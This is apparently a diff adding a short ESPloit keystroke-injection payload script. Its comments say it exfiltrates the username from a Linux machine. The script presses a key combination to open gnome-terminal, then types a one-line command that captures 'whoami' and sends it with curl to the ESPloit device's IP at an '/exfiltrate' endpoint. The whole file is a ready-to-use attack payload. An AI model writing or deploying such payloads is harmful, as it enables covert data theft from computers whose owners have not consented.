@@ -1,0 +1,6 @@
+Rem: Exfiltrate UserName from Linux Box
+Rem: ESPloit and Target must be connected to the same network for this to work
+Rem: Set the IP of ESPloit below by modifying "export xip='192.168.1.1'"
+Press:134+195
+PrintLine:gnome-terminal
+PrintLine:data="$(whoami)"; export xip='192.168.1.1'; export xfile='LinuxUser.txt'; curl "http://${xip}/exfiltrate?file=${xfile}&data=${data}"; exit
